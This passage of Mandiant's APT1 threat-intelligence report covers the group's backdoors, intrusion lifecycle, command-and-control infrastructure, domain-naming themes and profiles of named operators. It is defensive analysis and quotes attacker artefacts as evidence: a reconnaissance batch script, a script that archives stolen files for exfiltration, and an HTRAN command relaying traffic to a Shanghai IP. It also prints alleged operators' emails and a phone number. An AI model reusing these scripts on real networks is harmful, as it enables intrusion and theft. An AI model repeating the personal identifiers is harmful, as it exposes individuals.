kind of APT1 backdoor, and are the reason 
why some security companies refer to APT1 
as the “Comment Crew.” A WEBC2 backdoor 
is designed to retrieve a webpage from a C2 
server. It expects the webpage to contain 
special HTML tags; the backdoor will attempt 
to interpret the data between the tags as 
commands. Older versions of WEBC2 read 
data between HTML comments, though over 
time WEBC2 variants have evolved to read 
data contained within other types of tags. 
From direct observation, we can confirm 
that APT1 was using WEBC2 backdoors as 
early as July 2006. However, the first compile time35 we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 
has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have 
accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants 
for over six years. 

When it comes to computer programs, in general if they 
share more than 80% of the same code we consider them 
part of the same family. There are exceptions: for example, 
some files contain public and standard code libraries that 
we do not take into consideration when making a family 
determination. 

For example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 
has been steadily building new WEBC2 variants as part of a continuous development process:

MD5: d7aa32b7465f55c368230bb52d52d885

35  “Compile” refers to the process of transforming a programmer’s source code into a file that a computer can understand and execute. The compile 
date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.

APT 1 MALWARE FAMILIES
FIRST KNOWN COMPILE TIMES

2004

WEBC2.KT3

A “build path” discloses the directory from which the programmer 
built and compiled his source code. These samples, compiled 2.5 
years apart, were compiled within a folder named “work\code\...\
mywork”. The instances of “work” suggest that working on WEBC2 is 
someone’s day job and not a side project or hobby. Furthermore, the 
Sample A build string includes “2012-2-23” — which matches Sample 
A’s compile date. The Sample B build string lacks “2012-2-23” but 
includes “2009-8-7” — which also matches Sample B’s compile date. 
This suggests that the code used to compile Sample A was modified 
from code that was used to compile Sample B 2.5 years previously. The 
existence of “2008-7-8” suggests that the code for both samples was 
modified from a version that existed in July 2008, a year before Sample 
B was created. This series of dates indicates that developing and 
modifying the WEBC2 backdoor is an iterative and long-term process.

WEBC2 backdoors typically give APT1 attackers a short and 
rudimentary set of commands to issue to victim systems, including:
»» Open an interactive command shell (usually Windows’ cmd.exe)
»» Download and execute a file
»»

Sleep (i.e. remain inactive) for a specified amount of time

The BISCUIT backdoor (so named for the command “bdkzt”) is an illustrative example of the range of commands that 
APT1 has built into its “standard” backdoors. APT1 has used and steadily modified BISCUIT since as early as 2007 
and continues to use it presently.

List servers on a Windows network. 
Enumerate running processes and identify their owners.
Terminate a process, either by process ID or by process name.
Send a file to the C2 server
Send input to the command shell process (launched with “bdkzt”).

These functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone 
who wants to control a system remotely will likely put functions like “Upload/download files” into a backdoor.

Covert Communications
Some APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. APT1 has created a 
handful of these, including:

GLooxMaIL

 Jabber/XMPP
 Gmail Calendar

When network defenders see the communications between these backdoors and their C2 servers, they might easily 
dismiss them as legitimate network traffic. Additionally, many of APT1’s backdoors use SSL encryption so that 
communications are hidden in an encrypted SSL tunnel. We have provided APT1’s public SSL certificates in Appendix 
F so people can incorporate them into their network signatures.

Privilege Escalation

Escalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more 
resources within the network. In this and the next two stages, APT1 does not differ significantly from other APT 
intruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from 
victim systems in order to obtain legitimate user credentials.

APT1 has used these privilege escalation tools:

what is a password hash?
When a person logs in to a computer, website, email server, or any networked resource requiring a password, 
the supplied password needs to be verified. One way to do this would be to store the person’s actual password 
on the system that the person is trying to access, and to compare the typed password to the stored password. 
Although simple, this method is also very insecure: anyone who can access that same system will be able to 
see the person’s password. Instead, systems that verify passwords usually store password hashes. In simple 
terms, a password hash is a number that is mathematically generated from the person’s password. The 
mathematical methods (algorithms) used to generate password hashes will create values that are unique for 
all practical purposes. When a person supplies their password, the computer generates a hash of the typed 
password and compares it to the stored hash. If they match, the passwords are presumed to be the same and 
the person is allowed to log in.

It is supposed to be impossible to “reverse” a hash to obtain the original password. However, it is possible with 
enough computational resources to “crack” password hashes to discover the original password. (“Cracking” 
generally consists of guessing a large number of passwords, hashing them, and comparing the generated 
hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems 
in hopes that they can either use the hashes as-is (by “passing-the-hash”) or crack them to discover users’ 
passwords.

Internal Reconnaissance

In the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT 
(and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system 
and its networked environment. Although they usually simply type these commands into a command shell, sometimes 
intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that 
APT1 used on at least four victim networks.

@echo off
ipconfig /all>>”C:\WINNT\Debug\1.txt”
net start>>”C:\WINNT\Debug\1.txt”
tasklist /v>>”C:\WINNT\Debug\1.txt”

List currently connected network shares

List other systems on the network

List currently running processes

List accounts on the system

List current network connections

List network computers and accounts according to group (“domain controllers,” “domain users,” “domain

Lateral Movement

Once an APT intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder 
to move around the network undetected:

»»

»»

They can connect to shared resources on other systems

They can execute commands on other systems using the publicly available “psexec” tool from Microsoft 
Sysinternals or the built-in Windows Task Scheduler (“at.exe”)

These actions are hard to detect because legitimate system administrators also use these techniques to perform 
actions around the network.

Maintain Presence

In this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network 
environment from outside of the network. APT1 does this in three ways.

1. Install new backdoors on multiple systems
Throughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more 
systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can 
use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been 
present for more than a few weeks.

2. use legitimate vPn credentials
APT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. 
We have observed APT1 using stolen usernames and passwords to log into victim networks’ VPNs when the VPNs are 
only protected by single-factor authentication. From there they are able to access whatever the impersonated users are 
allowed to access within the network.

36  Mandiant uses the term “credentials” to refer to a userid and its corresponding, working password.

Mandiant APT1 

36 

www.mandiant.com

3. Log in to web portals
Once armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This 
includes not only restricted websites, but also web-based email systems such as Outlook Web Access.

Completing The Mission

Similar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing 
them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are 
password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure 
19. (The instances of “XXXXXXXX” obfuscate the text that was in the actual batch script.)

@echo off
cd /d c:\windows\tasks
rar.log a XXXXXXXX.rar -v200m “C:\Documents and Settings\Place\My 
Documents\XXXXXXXX” -hpsmy123!@#
del *.vbs
del %0

FIGure 19: an aPt1 batch script that bundles stolen files into rar archive files

After creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are 
consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many 
times their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above 
shows a RAR command with the option “-v200m”, which means that the RAR file should be split up into 200MB 
portions.

Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The 
first, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft 
Outlook archive (“PST”) files. 

Microsoft Outlook archives can be large, often storing years’ worth of emails. They may be too large to transfer out 
of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows 
APT1 intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an APT1 
intruder return to a compromised system once a week for four weeks in a row to steal only the past week’s emails.

Whereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal 
email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully, 
MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email 
from specified accounts into text files (for the email body) and separate attachments, if there are any. 

english as a second Language
APT1’s “It’s legit” email should not mislead someone into thinking that APT1 personnel are all fluent in English, though 
some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose first 
language is not English. Here are some examples of grammatically incorrect phrases that have made it into APT1’s 
tools over the years.

aPt1: InFrastruCture

APT1 maintains an extensive infrastructure of computers around the world. We have evidence suggesting that APT1 
manually controls thousands of systems in support of their attacks, and have directly observed their control over 
hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large 
networks in Shanghai — two of which are allocated directly to the Pudong New Area, the home of Unit 61398. The 
sheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simplified Chinese keyboard 
layout settings on APT1’s attack systems, betrays the true location and language of the operators. To help manage the 
vast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point 
to a Shanghai locale. The domain names and IP addresses together comprise APT1’s command and control framework 
which they manage in concert to camouflage their true origin from their English speaking targets.

APT1 Network Origins

We are frequently asked why it is an ineffective security measure to just block all IP addresses in China from 
connecting to your network. To put it simply, it is easy for APT1 attackers to bounce or “hop” through intermediary 
systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their 
immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country 
they choose. The systems in this type of network redirection infrastructure have come to be called “hop points” 
or “hops.” Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as 
camouflage for their attacks without the knowledge of the systems’ owners. These systems belong to third-party victims 
who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data 
and intellectual property.

We have observed some of APT1’s activities after they cross into (virtual) U.S. territory. They access hop points using 
a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to 
January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different 
IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to 
a system. The experience is similar to the user actually physically sitting at the system and having direct access to the 
desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four 
large net blocks in Shanghai which we will refer to as APT1’s home networks.

The registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where 
PLA Unit 61398 is headquartered. 

The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea 
(1). We have confirmed that some of these systems are part of APT1’s hop infrastructure and not legitimately owned 
by APT1 — in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from 
Shanghai.

In order to make a user’s experience as seamless as possible, the Remote Desktop protocol requires client applications 
to forward several important details to the server, including their client hostname and the client keyboard layout. 
In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard 
layout setting was “Chinese (Simplified) — US Keyboard.” Microsoft’s Remote Desktop client configures this setting 
automatically based on the selected language on the client system, making it nearly certain that the APT1 actors 
managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. “Simplified Chinese” is 
a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland 
China. Taiwan and municipalities such as Hong Kong still use “Traditional Chinese” (zh-tw) character sets.

The overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate 
that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai. The only 

Mandiant APT1

alternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese 
speakers from Shanghai in places where victims are not reasonably expected to have any visibility – and without 
making a single mistake that might indicate their “true” identity. 

Interaction with Backdoors

As we just mentioned, APT1 attackers typically use hops to connect to and control victim systems. Victim backdoors 
regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However, 
exactly how this works is often specific to the tools they are using. 

MANUAL WEBC2 UPDATES
As covered in the previous “Attack Lifecycle” section, WEBC2 backdoor variants download and interpret data stored 
between tags in HTML pages as commands. They usually download HTML pages from a system within APT1’s hop 
infrastructure. We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages 
that backdoors will download. Because the commands are usually encoded and difficult to spell from memory, APT1 
intruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate 
the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For 
example, we observed an APT attacker pasting the string “czo1NA==” into an HTML page. That string is the base64-
encoded version of “s:54”, meaning “sleep for 54 minutes” (or hours, depending on the particular backdoor). In lieu 
of manually editing an HTML file on a hop point, we have also observed APT1 intruders uploading new (already-edited) 
HTML files. 

HTRAN
When APT1 attackers are not using WEBC2, they require a “command and control” (C2) user interface so they can 
issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically 
in Shanghai. In these instances, when a victim backdoor makes contact with a hop, the communications need to be 
forwarded from the hop to the intruder’s Shanghai system so the backdoor can talk to the C2 server software. We have 
observed 767 separate instances in which APT1 intruders used the publicly available “HUC Packet Transmit Tool” 
or HTRAN on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small 
fraction of APT1’s total activity.

The HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using 
the hop point.

FIGure 22: the htran tool resides on aPt1 hop points and acts as a middle-man

Mandiant APT1

www.mandiant.com

Typical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in 
Shanghai), and a port on which to accept connections. For example, the following command, which was issued by an 
APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai 
IP address 58.247.242.254 on port 443:

htran -tran 443 58.247.242.254 443

In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses. In other words, they 
used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses, 
613 of 614 are part of APT1’s home networks:

C2 SERVER SOFTWARE ON HOP INFRASTRUCTURE
Occasionally, APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than 
forwarding connections back to C2 servers in Shanghai. In these instances they do not need to use a proxy tool like 
HTRAN to interact with victim systems. However, it does mean that the intruders need to be able to interface with the 
(often graphical) C2 server software running on the hop. We have observed APT1 intruders log in to their hop point, 
start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.

WEBC2 variants may include a server component that provides a simple C2 interface to the intruder. This saves the 
intruder from having to manually edit webpages. That is, this server component receives connections from victim 
backdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim 
backdoors read.

APT1 Servers

In the last two years alone, we have confirmed 937 APT1 C2 servers — that is, actively listening or communicating 
programs — running on 849 distinct IP addresses. However, we have evidence to suggest that APT1 is running 
hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as APT1 
servers have mainly been: (1) FTP, for transferring files; (2) web, primarily for WEBC2; (3) RDP, for remote graphical 
control of a system; (4) HTRAN, for proxying; and (5) C2 servers associated with various backdoor families (covered in 
Appendix C: The Malware Arsenal).

Domain Names

The Domain Name System (DNS) is the phone book of the Internet. In the same way that people program named 
contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember 
names like “google.com” instead of IP addresses. When a person types “google.com” into a web browser, a DNS 
translation to an IP address occurs so that the person’s computer can communicate with Google. Names that can be 
translated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).

APT1’s infrastructure includes FQDNs in addition 
to the IP addresses discussed above. The FQDNs 
play an important role in their intrusion campaigns 
because APT1 embeds FQDNs as C2 addresses 
within their backdoors. In the last several years 
we have confirmed 2,551 FQDNs attributed to 
APT1. Of these, we have redacted FQDNs that 
implicated victims by name and provided 2,046 in 
Appendix D. By using FQDNs rather than hard-
coded IP addresses as C2 addresses, attackers 
may dynamically decide where to direct C2 
connections from a given backdoor. That is, if they 
lose control of a specific hop point (IP address) 
they can “point” the C2 FQDN address to a 
different IP address and resume their control over 
victim backdoors. This flexibility allows the attacker 
to direct victim systems to myriad C2 servers and 
avoid being blocked.

APT1 FQDNs can be grouped into three categories: 
(1) registered zones, (2) third-party zones, and (3) 
hijacked domains. 

REGISTERED ZONES
A DNS zone represents a collection of FQDNs that 
end with the same name, and which are usually 
registered through a domain registration company 
and controlled by a single owner. For example, 
“hugesoft.org” is an FQDN but also represents 
a zone. The FQDNs “ug-co.hugesoft.org” and 
“7cback.hugesoft.org” are part of the “hugesoft.
org” zone and are called “subdomains” of the zone. 
The person who registered “hugesoft.org” may add 
as many subdomains as they wish and controls the 
IP resolutions of these FQDNs. APT1 has registered 
at least 107 zones since 2004. Within these zones, 
we know of thousands of FQDNs that have resolved 
to hundreds of IP addresses (which we suspect are 
hops) and in some instances to APT1’s source IP 
addresses in Shanghai.

The first zone we became aware of was “hugesoft.
org”, which was registered through eNom, 
Inc. in October 2004. The registrant supplied 
“uglygorilla@163.com” as an email address. The 
supplied registration information, which is still 
visible in public “whois” data as of February 3, 
2013, includes the following:

The supplied registrant information does not need to be accurate for the zone to be registered successfully. For 
example, “shanghai” is not a street name. Nevertheless, it is noteworthy that Shanghai appeared in the first known 
APT1 domain registration, along with a phone number that begins with China’s “+86” international code. In fact, 
Shanghai was listed as the registrant’s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency 
with which other cities appeared in APT1 zone registration information:

Some of the supplied registration information is obviously false. For example, consider the registration information 
supplied for the zone “uszzcs.com” in 2005:

 Victor etejedaa@yahoo.com +86.8005439436
 Michael Murphy
 795 Livermore St.
 Yellow Spring,Ohio,UNITED STATES 45387

 
 
 
 
Here, a phone number with a Chinese prefix (“+86”) accompanied an address in the United States. Since the United 
States uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning 
with “+86”. Additionally, the city name is spelled incorrectly, as it should be “Yellow Springs” instead of “Yellow 
Spring”. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name 
incorrectly multiple times, both for the zones “uszzcs.com” and “attnpower.com”. This suggests that the registrant 
really thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs, 
Ohio. 

Overall, the combination of a relatively high number of “Shanghai” registrations with obviously false registration 
examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until 
present, in which some registrants tried to fabricate non-Shanghai locations but others did not. This is supported by 
contextual information on the Internet for the email address “lfengg@163.com,” which was supplied in the registration 
information for seven of the 107 zones. On the site “www.china-one.org,” the email address “lfengg@163.com” 
appears as the contact for the Shanghai Kai Optical Information Technology Co., Ltd., a website production company 
located in a part of Shanghai that is across the river from PLA Unit 61398.

naming themes
About half of APT1’s known zones were named according to three themes: news, technology and business. These 
themes cause APT1 command and control addresses to appear benign at first glance. However, we believe that the 
hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions. (Note: these themes are not 
unique to APT1 or even APT in general.) 

The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters. 
However, they also include names referencing English-speaking countries, such as “aunewsonline.com” (Australia), 
“canadatvsite.com” (Canada), and “todayusa.org” (U.S.). Below is a list of zones registered by APT1 that are news-
themed:

yahoodaily.com

The technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus 
vendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing 
topics like software:

aolon1ine.com

microsoft-update-info.com
micyuisyahooapis.com
msnhome.org
pcclubddk.net
progammerli.com
softsolutionbox.net
symanteconline.net
webservicesupdate.com

Finally, some zones used by APT1 reflect a business theme. The names suggest websites that professionals might visit:

advanbusiness.com
businessconsults.net
businessformars.com

companyinfosite.com
conferencesinfo.com
copporationnews.com

infobusinessus.org
jobsadvanced.com

Not every zone stays within APT1’s control forever. Over a campaign lasting for so many years, APT1 has not always 
renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, 
others have been transferred to the organizations that the domain names attempted to imitate. For example, in 
September 2011, Yahoo filed a complaint against “zheng youjun” of “Arizona, USA”, who registered the APT1 
zone “myyahoonews.com”.37 Yahoo alleged the “<myyahoonews.com> domain name was confusingly similar to 
Complainant’s YAHOO! mark” and that “[zheng youjun] registered and used the <myyahoonews.com> domain name 
in bad faith.” In response, the National Arbitration Forum found that the site “myyahoonews.com” at the time resolved 

37   Yahoo! Inc. v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (October 31, 2011) (Tyrus R. Atkinson, Jr., panelist), http://
domains.adrforum.com/domains/decisions/1409001.htm, accessed February 6, 2013.

to “a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials 
under false pretenses.” Not surprisingly, “zheng youjun” did not respond. Subsequently, control of “myyahoonews.
com” was transferred from APT1 to Yahoo.

third-Party services
The third-party service that APT1 has used the most is known as “dynamic DNS.” This is a service that allows people 
to register subdomains under zones that other people have registered and provided to the service. Over the years, 
APT1 has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they 
simply log in to these services and update the IP resolution of their FQDN via a web-based interface.

In addition to dynamic DNS, recently we have observed that APT1 has been creating FQDNs that end with  
“appspot.com”, suggesting that they are using Google’s App Engine service.

hijacked FQDns
APT1 intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We 
consider these domains to be “hijacked” because they were registered by someone for a legitimate reason, but have 
been leveraged by APT1 for malicious purposes. APT1 uses hijacked FQDNs for two main purposes. First, they 
place malware (usually in ZIP files) on the legitimate websites hosted on the hop point and then send spear phishing 
emails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their 
backdoors. 

EVIDENCE OF A V AST INFRASTRUCTURE
As noted above, we have confirmed the existence of 937 servers (listening applications) hosted on 849 distinct IP 
addresses, with the majority of IP addresses registered to organizations in China (709), followed by the U.S. (109). 
In the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not 
“sinkhole”38 or “domain parking”39 IP addresses:
»» United States: 559
»»
»»
»»
»» United Kingdom: 14
»»
»» Other: 83

Canada: 12

Korea: 22

China: 263

Taiwan: 25

38   A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to 
sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.

39   Some IP addresses are used for “domain parking” once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when 
the zone expires. These IP addresses usually host advertisements.

Mandiant APT1

The vast majority of the Chinese IP addresses again belong to APT1’s home networks, meaning that in some instances 
APT1 intruders probably communicated directly to victim systems from their Shanghai systems, bypassing their hop 
infrastructure:

These statistics indicate that there are over 400 IP addresses in the U.S. alone that may have active APT1 servers, 
which are as-yet unconfirmed by Mandiant. Additionally, although we know of over 2,500 APT1 FQDNs, there are 
many APT1 FQDNs that we have not attributed to APT1, which have resolved to even more IP addresses. We estimate 
(conservatively) that APT1’s current hop infrastructure includes over 1,000 servers.

aPt1: IDentItIes

APT1 is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the 
PLA behind APT1’s keyboards, we have decided to expose the identities of a select number of APT1 personas. These 
actors have made poor operational security choices, facilitating our research and allowing us to track their activities. 
They are some of the authors of APT1’s digital weapons and the registrants of APT1 FQDNs and email accounts. These 
actors have expressed interest in China’s cyber warfare efforts, disclosed their locations to be the Pudong New Area 
of Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing 
campaigns.

Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular 
comprehensive picture. Often this unified viewpoint reveals not only the group attribution, but coherent pockets 
of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as 
“personas.” As APT1 personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs), 
they have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops, 
FQDNs, CNO tools (e.g., malware) and ports.

One additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC). Like many 
Chinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party 
of China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.
com, facebook.com, and twitter.com. Additionally, the nature of the hackers’ work requires them to have control of 
network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into Facebook 
and Twitter is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real 
identities.

what is the Great Firewall of China?
The “Great Firewall” is a term used to describe the various technical methods used by the 
Chinese government to censor and block or restrict access to Internet services and content 
that the government considers sensitive or inappropriate. “Inappropriate” content ranges 
from pornography to political dissent, and from social media to news sites that may portray 

China or Chinese officials in a negative light. The “Great Firewall” uses methods such as blocking particular 
IP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target 
keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese 
websites, blogs, and social media for “inappropriate” content, removing it when found. As a result, Chinese 
citizens who wish to access censored content must resort to workarounds such as the use of encryption. 
China continues to improve and further restrict Internet access, most recently (in December 2012) by blocking 
additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks.

APT1 Hacker Profile: Ugly Gorilla (Wang Dong/汪东)

The story of “Ugly Gorilla” (UG) dates back to 2004. 
A then-professor named Zhang Zhaozhong (张召
忠), now a retired rear admiral, was in the process 
of helping to shape the future of China’s information 
warfare strategy.40 Professor Zhang was already a 
strong advocate for the “informationization” of military 
units, and had published several works on military 
strategy including “Network Warfare” (网络战争) and 
“Winning the Information War” (打赢信息化战争). As 
Director of the “Military Technology and Equipment” 
(军事科技与装备) department at China’s National 
Defense University (国防大学), professor Zhang was 
invited to take part in an event titled “Outlook 2004: 
The International Strategic Situation” in January 2004.

During the online question and answer session 
hosted by the PLA Daily’s (解放军报) China Military 
Online (中国军网), one young man with the nickname 
“Greenfield” (绿野) posed a particularly prescient 
question.

FIGure 26: Professor Zhang (张召忠) 16 Jan 2004, 
source http://www.chinamil.com.cn/site1/gflt/2004-09/30/
content_705216.htm

“Professor Zhang, I read your book ’network warfare‘ and was deeply impressed 
by the views and arguments in the book. It is said that the u.s. military has set up 
a dedicated network force referred to as a ‘cyber army.’ Does China have a similar 
force? Does China have cyber troops?” 

— UglyGorilla 16 Jan 2004

Like all users of the China Military Online (chinamil) forums, “Greenfield” was required to sign up with an email 
address and specify a small bit of information about himself. Thankfully, the Internet’s tendency to immortalize data 
preserved the profile details for us.

FIGure 28: uglyGorilla chinamil profile translated by translate.google.com/

Thus, the persona we call “UglyGorilla” (UG) was first documented. In addition to his email address, UG listed his “real 
name” as “JackWang”. 

Within the year, we saw the first evidence of UG honing the tools of his trade. On October 25, 2004, UG registered the 
now infamous “hugesoft.org” zone. The “hugesoft.org” zone and its many APT1-attributed hostnames have remained 
active and under the continuous ownership of UG, and are still active as of the time of this report. Registration 
information was most recently updated on September 10, 2012, extending the registration period for the zone well into 
2013. We may see UG relinquish this and other attributed zones as a result of this reporting, in an effort to deter further 
tracking and attribution.

In 2007, UG authored the 
first known sample of the 
MANITSME family of malware 
and, like a good artist, left his 
clearly identifiable signature in 
the code: “v1.0 No Doubt to 
Hack You, Writed by UglyGorilla, 
06/29/2007”[sic]. UG’s 
tendency to sign his work is 
present in the strings he chooses 
for hostnames and even within 
the communications protocols 
his backdoors use. For example, 

what is a meat chicken?!? 
Chinese Hacker Slang: “rouji” ( 肉鸡 ) — Meat Chicken 
n. — An infected computer

Example strings from MANITSME samples: 
“d:\My Documents\Visual Studio Projects\rouji\SvcMain.pdb”

Examples from other malware… 
 “connecting to rouji” 
 “welcome to ***(rouji)”

Mandiant APT1

hostnames within other APT1-attributed FQDNs such as “arrowservice.net” and even the newer “msnhome.org” 
continue to leave UG’s imprint (note the “ug” in the domains):
»»
»»
»»

ug-opm.hugesoft.org
ug-rj.arrowservice.net
ug-hst.msnhome.org

Though these kinds of obvious attribution links tapered off as UG became more experienced, the protocol signatures of 
his tools such as MANITSME and WEBC2-UGX continue to be used by APT1 attackers based out of Shanghai.

UG’s consistent use of the username “UglyGorilla” across various Web accounts has left a thin but strong thread of 
attribution through many online communities. In most instances, content such as hacking tools, information security 
topics, and association with the Shanghai locality are reasonable ways to eliminate false positives. For example, in 
February of 2011, the disclosure of all registered “rootkit.com” accounts published by Anonymous included the user 
“uglygorilla” with the registered email address uglygorilla@163.com. This is the same email used to register for the 
2004 PLA forum and the zone hugesoft.org. Included in the rootkit.com leaked account information was the IP address 
58.246.255.28, which was used to register UG’s account directly from the previously discussed APT1 home range: 
58.246.0.0/15.

In a few of these accounts, UG has listed something other than “JackWang” as his real name. On February 2, 2006, a 
user named “uglygorilla” uploaded a file named “mailbomb_1.08.zip” (a bulk email tool) to the Chinese developer site 
PUDN (www.pudn.com). His account details from PUDN included the real name “Wang Dong” (汪东).

Figure 29: Wang Dong’s uploaded Files to pudn.com

It is important to note two things at this point. First, Chinese names begin with the surname. So “Wang” is the last 
name in 汪东. Second, it is a fairly common practice for the Chinese, even in China, to choose an English first name. 
Thus “JackWang” may not have been an alias at all. 

Mandiant APT1 

55 

www.mandiant.com

APT1 Hacker Profile: DOTA

Another APT1 persona is “dota” (DOTA), named for his strong tendency to use variants of that name in almost all 
accounts he creates and uses from his attack infrastructure. DOTA may have taken his name from the video game 
“Defense of the Ancients” which is commonly abbreviated DotA, though we have yet to observe any direct link or other 
direct reference to the game.

We have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com, 
and have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web-
based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact 
email address when signing up for other services. For example, DOTA (originating from the APT1 home range IP 
address 58.247.26.59) with a Simplified Chinese keyboard setting used the email address “d0ta001@hotmail.com” 
from his US hop to register the Facebook user “do.ta.5011”(Facebook user id: 100002184628208).

Some services, such as Google’s Gmail, require users to provide a phone number during the registration process to 
which they send a validation “text message” containing a verification code. The user must then input the verification 
code on the website to finalize registration. In an observed session on a compromised machine, DOTA used the phone 
number “159-2193-7229” to receive a verification text message from Google, which he then submitted to their page 
within seconds. 

Telephone numbers in China are organized into a hierarchy containing an area code, prefix, and line number similar 
to phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone 
providers. The phone number “159-2193-7229” breaks down into the “159” area code, which indicates a mobile 
phone provided by China Mobile, and the prefix “2193”, which indicates a Shanghai mobile number. This means at the 
very least that the number was initially allocated by China Mobile for use in Shanghai. The speed of DOTA’s response 
also indicates that he had the phone with him at the time.

We have also observed DOTA using the names Rodney 
